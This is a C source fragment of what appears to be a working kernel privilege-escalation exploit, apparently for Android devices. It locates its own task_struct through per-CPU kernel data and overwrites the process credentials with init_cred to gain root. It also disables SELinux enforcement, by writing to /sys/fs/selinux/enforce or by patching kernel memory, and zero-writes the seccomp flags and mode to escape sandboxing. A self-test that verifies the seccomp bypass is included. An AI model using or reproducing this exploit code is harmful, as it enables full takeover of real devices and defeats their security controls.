  if (!slide_eqs_zero_write(task + EQS_TASK_THREAD_INFO_FLAGS_OFF,
                            "seccomp_flags", idx)) {
    pr_error("eqs stage-2 TIF_SECCOMP clear failed\n");
    return 0;
  }
  if (!slide_eqs_zero_write(task + TASK_SECCOMP_OFF, "seccomp_mode", idx)) {
    pr_error("eqs stage-2 seccomp.mode clear failed\n");
    return 0;
  }
  return 1;
}

/* Highest ONLINE CPU of the system (not of the task's affinity mask: run_exploit
 * already pinned us to CORE=0, so sched_getaffinity() here would only ever
 * report cpu 0). The per_cpu_offset read's shape-0 collateral writes L into
 * per_cpu_offset[cpu+1]; on the top online CPU that index is not a live CPU
 * (the standalone eqs exploit does the same on cpu 7), whereas corrupting a low
 * index would break every per_cpu_ptr() for that CPU. */
static int eqs_cpu_online(int cpu) {
  char path[160];
  snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/online", cpu);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 1; /* no online node: always-online cpu (cpu0) */
  }
  char b[8] = {0};
  ssize_t n = read(fd, b, sizeof(b) - 1);
  close(fd);
  if (n <= 0) {
    return 1;
  }
  return b[0] == '1';
}

static int eqs_pick_top_cpu(void) {
  long conf = sysconf(_SC_NPROCESSORS_CONF);
  if (conf <= 0 || conf > CPU_SETSIZE) {
    conf = CPU_SETSIZE;
  }
  for (int cpu = (int)conf - 1; cpu >= 0; cpu--) {
    if (eqs_cpu_online(cpu)) {
      return cpu;
    }
  }
  return sched_getcpu();
}

/* Pin to the top online CPU and read this process's own task_struct through
 * __per_cpu_offset[cpu] -> per-cpu __entry_task (the same derivation the
 * standalone eqs exploit uses). Shared by stage-2, the seccomp self-test and the
 * zero-write self-test's caller. `idx` continues the per-run slot sequence. */
static int eqs_derive_own_task(int *idx, uint64_t *task_out, int *cpu_out) {
  *task_out = 0;
  *cpu_out = -1;
  int want_cpu = eqs_pick_top_cpu();
  if (want_cpu >= 0) {
    pin_to_core((size_t)want_cpu);
    for (int spin = 0; spin < 200 && sched_getcpu() != want_cpu; spin++) {
      usleep(1000);
    }
  }
  int cpu = sched_getcpu();
  if (cpu < 0 || cpu > 63) {
    pr_error("eqs own-task bad cpu=%d\n", cpu);
    return 0;
  }

  uintptr_t percpu_slot = (uintptr_t)eqs_kaslr_base + EQS_OFF_PER_CPU_OFFSET +
                          (uintptr_t)cpu * sizeof(uint64_t);
  uint64_t percpu_delta = 0;
  if (!eqs_read64(percpu_slot, &percpu_delta, "per_cpu_offset", idx)) {
    pr_error("eqs own-task per_cpu_offset read failed\n");
    return 0;
  }
  if ((percpu_delta & (PAGE_SIZE - 1)) != 0) {
    pr_error("eqs own-task per_cpu_offset not page aligned cpu=%d "
             "delta=%016llx\n",
             cpu, (unsigned long long)percpu_delta);
    return 0;
  }

  uintptr_t entry_slot =
      (uintptr_t)eqs_kaslr_base + EQS_OFF_ENTRY_TASK + (uintptr_t)percpu_delta;
  uint64_t task = 0;
  if (!eqs_read64(entry_slot, &task, "entry_task", idx)) {
    pr_error("eqs own-task __entry_task read failed\n");
    return 0;
  }
  if (task == 0 || (task >> 48) != 0xffff || (task & 7) != 0) {
    pr_error("eqs own-task bad task=%016llx\n", (unsigned long long)task);
    return 0;
  }
  pr_success("eqs own-task cpu=%d entry_slot=%016zx percpu_delta=%016llx "
             "task=%016llx\n",
             cpu, entry_slot, (unsigned long long)percpu_delta,
             (unsigned long long)task);
  *task_out = task;
  *cpu_out = cpu;
  return 1;
}

int slide_eqs_root_stage(void) {
  if (!eqs_kaslr_base) {
    pr_error("eqs stage-2 without a KASLR base\n");
    return 0;
  }

  int idx = eqs_next_slot_idx; /* continue after the slots the leak consumed */
  uint64_t task = 0;
  int cpu = -1;
  if (!eqs_derive_own_task(&idx, &task, &cpu)) {
    return 0;
  }
  pr_success("eqs stage-2 enter cpu=%d pid=%d uid=%u kaslr=%016llx\n", cpu,
             getpid(), getuid(), (unsigned long long)eqs_kaslr_base);

  int enforcing = eqs_read_enforcing();
  pr_success("eqs stage-2 pre-cred selinux enforcing=%d\n", enforcing);

  /* Store the runtime IMAGE VA of init_cred (not the direct-map alias): the
   * value becomes task->real_cred/cred and every kernel pointer comparison must
   * see the same address the symbol resolves to. Shape-0's collateral
   * *(init_cred+8) = target lands on gid/suid, leaving uid/euid 0. */
  uintptr_t init_cred =
      (uintptr_t)eqs_kaslr_base + (uintptr_t)(INIT_CRED - active_image_text_base());
  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;

  int rooted = 0;
  for (int round = 1; round <= EQS_WRITE_ATTEMPTS && !rooted; round++) {
    pr_info("eqs stage-2 cred round %d/%d real_cred=%016zx cred=%016zx "
            "init_cred=%016zx\n",
            round, EQS_WRITE_ATTEMPTS, real_cred_slot, cred_slot, init_cred);
    eqs_write64(real_cred_slot, init_cred, "install_real_cred", &idx);
    eqs_write64(cred_slot, init_cred, "install_cred", &idx);
    rooted = getuid() == 0 && geteuid() == 0;
    if (!rooted) {
      pr_warning("eqs stage-2 cred round %d not root uid=%u euid=%u\n", round,
                 getuid(), geteuid());
    }
  }
  pr_success("eqs stage-2 post-cred uid=%u euid=%u gid=%u egid=%u pid=%d\n",
             getuid(), geteuid(), getgid(), getegid(), getpid());
  eqs_raw_emit("[+] eqs-root uid=%u euid=%u gid=%u egid=%u pid=%d\n", getuid(),
               geteuid(), getgid(), getegid(), getpid());
  if (!rooted) {
    return 0;
  }

  /* SELinux: prefer the byte-granular userspace write (CAP_MAC_ADMIN comes for
   * free from init_cred). Only if that is refused, fall back to the primitive,
   * whose stored pointer has byte0 == 0 so `enforcing` reads false. */
  int enforcing_after = eqs_read_enforcing();
  if (enforcing_after != 0) {
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
      ssize_t wrote = write(fd, "0", 1);
      int saved = errno;
      close(fd);
      pr_success("eqs stage-2 selinux enforce write ret=%zd errno=%d\n", wrote,
                 saved);
    } else {
      pr_warning("eqs stage-2 selinux enforce open failed errno=%d\n", errno);
    }
    enforcing_after = eqs_read_enforcing();
  }
  if (enforcing_after != 0) {
    uintptr_t selinux_slot =
        (uintptr_t)eqs_kaslr_base +
        (uintptr_t)(SELINUX_ENFORCING - active_image_text_base());
    uintptr_t zero_value = eqs_runtime_alias(active_image_text_base() +
                                             EQS_SELINUX_ZERO_IMAGE_OFF);
    if (eqs_write64(selinux_slot, zero_value, "selinux_zero", &idx)) {
      enforcing_after = eqs_read_enforcing();
    } else {
      pr_warning("eqs stage-2 selinux_zero primitive failed\n");
    }
  }

  /* W3 equivalent: clear this task's seccomp filter with shape-2 zero writes
   * (only when a filter is actually present; the adb/shell flow has none). */
  eqs_clear_seccomp((uintptr_t)task, &idx);

  pr_success("eqs-stage2-summary task=%016llx init_cred=%016zx selinux=%d->%d "
             "uid=%u euid=%u\n",
             (unsigned long long)task, init_cred, enforcing, enforcing_after,
             getuid(), geteuid());
  eqs_raw_emit("[+] eqs-stage2-summary selinux=%d->%d uid=%u euid=%u\n",
               enforcing, enforcing_after, getuid(), geteuid());
  return getuid() == 0 && geteuid() == 0;
}

/* End-to-end seccomp proof (GHOSTLOCK_SECCOMP_TEST=1). The parent first learns
 * its OWN task_struct (so no racy child-task leak is needed), then installs
 * SECCOMP_MODE_STRICT on itself and blocks in read()/write() only (the STRICT
 * allowlist), while a pre-forked, filter-free child zero-writes the parent's
 * thread_info.flags and seccomp.mode. If the clear worked, the parent's next
 * getpid() is allowed; if it did not, STRICT SIGKILLs the parent (the device
 * survives either way), so this can never BUG the kernel.
 * STRICT is enough: mode 1 needs no BPF and no privileges. */
int slide_eqs_seccomp_selftest(void) {
  eqs_init_slot_rotation();
  if (!eqs_kaslr_base && !slide_leak_kernel_base()) {
    pr_error("eqs seccomp-selftest: KASLR leak failed\n");
    return 0;
  }
  int idx = eqs_next_slot_idx;
  uint64_t task = 0;
  int cpu = -1;
  if (!eqs_derive_own_task(&idx, &task, &cpu)) {
    return 0;
  }

  int go[2] = {-1, -1};
  int done[2] = {-1, -1};
  if (pipe(go) != 0 || pipe(done) != 0) {
    pr_error("eqs seccomp-selftest pipe failed errno=%d\n", errno);
    return 0;
  }

  pid_t child = fork(); /* forked BEFORE STRICT: the child stays filter-free */
  if (child < 0) {
    pr_error("eqs seccomp-selftest fork failed errno=%d\n", errno);
    return 0;
  }
  if (child == 0) {
    close(go[1]);
    close(done[0]);
    char c = 0;
    ssize_t nr = read(go[0], &c, 1); /* wait until STRICT is installed */
    (void)nr;
    int cleared = 0;
    /* Same order as eqs_clear_seccomp: flags first, mode only if flags landed. */
    if (slide_eqs_zero_write((uintptr_t)task + EQS_TASK_THREAD_INFO_FLAGS_OFF,
                             "seccomp_flags", &idx)) {
      if (slide_eqs_zero_write((uintptr_t)task + TASK_SECCOMP_OFF,
                               "seccomp_mode", &idx)) {
        cleared = 1;
      }
    }
    char r = cleared ? 'Y' : 'N';
    ssize_t nw = write(done[1], &r, 1);
    (void)nw;
    _exit(cleared ? 0 : 1);
  }

  close(go[0]);
  close(done[1]);
  if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT) != 0) {
    pr_error("eqs seccomp-selftest PR_SET_SECCOMP failed errno=%d\n", errno);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    return 0;
  }
  /* From here on the parent may only use read/write/_exit/sigreturn. */
  ssize_t gw = write(go[1], "G", 1);
  (void)gw;
  char r = 0;
  ssize_t nr = read(done[0], &r, 1);
  (void)nr;
  if (r != 'Y') {
    /* Clear failed; getpid() would be SIGKILLed, so report with write() only. */
    eqs_raw_emit("[+] eqs-seccomp-selftest ok=0 child_cleared=%c\n",
                 r ? r : '?');
    _exit(0);
  }
  long pid = syscall(SYS_getpid); /* forbidden under STRICT -> SIGKILL if uncleared */
  eqs_raw_emit("[+] eqs-seccomp-selftest ok=%d child_cleared=%c getpid=%ld "
               "task=%016llx cpu=%d\n",
               pid == (long)getpid() ? 1 : 0, r, pid,
               (unsigned long long)task, cpu);
  _exit(0);
}
